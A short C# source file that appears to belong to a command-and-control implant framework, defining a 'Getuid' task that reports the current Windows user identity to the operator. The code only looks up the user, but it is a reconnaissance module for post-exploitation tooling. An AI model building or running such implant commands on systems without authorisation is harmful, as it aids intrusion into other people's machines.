using System.Security.Principal;

using Implant.Models;

namespace Implant.Tasks.Execute
{
    class Getuid : ImplantCommands
    {
        public override string Name => "Getuid";

        public override string Execute(ImplantTask task)
        {
            return $"{WindowsIdentity.GetCurrent().Name}\n";
        }
    }
}
